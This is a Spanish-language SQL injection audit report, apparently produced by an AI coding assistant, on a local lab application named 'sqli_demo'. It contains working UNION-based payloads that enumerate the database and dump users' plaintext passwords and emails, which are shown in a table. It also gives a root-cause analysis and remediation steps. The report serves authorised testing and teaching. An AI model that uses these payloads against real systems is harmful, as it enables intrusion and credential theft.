# Informe de Auditoría de Seguridad — SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-21T07:50:52  
**Analista:** GitHub Copilot CLI (Claude Sonnet 4.6)  
**Tipo de análisis:** Manual — SQL Injection

---

## Resumen Ejecutivo

Se identificó y explotó con éxito una vulnerabilidad crítica de **SQL Injection** en el parámetro `id` de la aplicación web. La explotación permitió extraer credenciales de todos los usuarios de la base de datos `sqli_demo`.

---

## 1. Reconocimiento

- **URL analizada:** `http://web.dev.local:8083/`
- **Tecnología detectada:** PHP, MariaDB 10.11.14, Apache
- **Parámetro vulnerable:** `id` (método GET)
- **Formulario:** Search user por ID

---

## 2. Detección de la Vulnerabilidad

### Prueba inicial — Inyección de comilla simple

**Payload:** `id=1'`

**Respuesta del servidor:**
```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax;
check the manual that corresponds to your MariaDB server version for the right syntax
to use near ''1''' at line 1 in /var/www/html/low.php:11
```

El servidor revela:
- Error SQL detallado (verbose error)
- Ruta del archivo fuente: `/var/www/html/low.php`
- SGBD: MariaDB
- La consulta **no sanitiza** la entrada del usuario

**Clasificación:** SQL Injection — Error-Based / UNION-Based  
**Severidad:** **CRÍTICA**

---

## 3. Explotación

### 3.1 Determinación del número de columnas

Se determinó que la consulta devuelve **2 columnas** (first_name, last_name).

**Payload:**
```
id=99' UNION SELECT 'a','b'-- -
```
**Resultado:** `First name: a | Surname: b` ✅

---

### 3.2 Extracción de información del servidor

| Campo | Valor |
|-------|-------|
| Versión BD | `10.11.14-MariaDB-ubu2204` |
| Usuario BD | `root@172.18.0.3` |
| Base de datos activa | `sqli_demo` |
| Bases de datos disponibles | `information_schema, sqli_demo, sys, mysql, performance_schema` |

**Payload usado:**
```sql
id=99' UNION SELECT version(),user()-- -
```

---

### 3.3 Enumeración de tablas y columnas

**Tabla encontrada en `sqli_demo`:** `users`

**Columnas de `users`:**
- `user_id`, `first_name`, `last_name`, `username`, `password`, `email`

---

### 3.4 Volcado de credenciales

**Payload:**
```sql
id=99' UNION SELECT group_concat(user_id,':',username,':',password,':',email 
ORDER BY user_id SEPARATOR '||'),2 FROM sqli_demo.users-- -
```

**Credenciales extraídas:**

| ID | Username | Password | Email |
|----|----------|----------|-------|
| 1 | admin | password123 | admin@example.com |
| 2 | jsmith | secret456 | jane@example.com |
| 3 | bjohnson | mypass789 | bob@example.com |
| 4 | awilliams | qwerty123 | alice@example.com |
| 5 | cbrown | password | charlie@example.com |
| 6 | ddavis | secure123 | diana@example.com |
| 7 | emiller | hackme | eve@example.com |
| 8 | fwilson | admin123 | frank@example.com |

> ⚠️ Las contraseñas están almacenadas en **texto plano** (sin hash).

---

## 4. Análisis de Impacto

| Aspecto | Evaluación |
|---------|-----------|
| Confidencialidad | **ALTO** — Acceso completo a credenciales de usuarios |
| Integridad | **ALTO** — Posibilidad de modificar datos en BD |
| Disponibilidad | **MEDIO** — Potencial DROP/DELETE de tablas |
| Privilegios BD | **CRÍTICO** — La app corre como `root` en la BD |

---

## 5. Causa Raíz

El código en `/var/www/html/low.php` construye la consulta SQL concatenando directamente el input del usuario sin sanitización ni uso de prepared statements:

```php
// Código vulnerable (estimado):
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
$result = mysqli_query($conn, $query);
```

---

## 6. Recomendaciones

1. **Usar Prepared Statements / Consultas parametrizadas:**
   ```php
   $stmt = $conn->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
   $stmt->bind_param("s", $id);
   $stmt->execute();
   ```

2. **Hashear contraseñas** con `password_hash()` (bcrypt) en lugar de texto plano.

3. **Principio de mínimo privilegio:** La aplicación no debe conectarse a la BD como `root`. Crear un usuario con permisos limitados (solo SELECT sobre las tablas necesarias).

4. **Deshabilitar errores verbose** en producción (`display_errors = Off` en php.ini).

5. **Validar y sanitizar** todas las entradas del usuario (whitelist de tipos/formatos esperados).

6. **WAF:** Considerar implementar un Web Application Firewall para detectar patrones de inyección.

---

## 7. Conclusión

La aplicación presenta una vulnerabilidad **SQL Injection crítica** explotable de forma manual y trivial. La explotación fue completamente exitosa: se extrajeron las credenciales de los 8 usuarios de la base de datos, incluyendo la cuenta administradora. La combinación de contraseñas en texto plano y la ejecución de la BD como `root` agrava considerablemente el riesgo.

**CVSS Score (estimado):** 9.8 — CRÍTICO

---

*Informe generado el 2026-04-21T07:50:52 UTC*
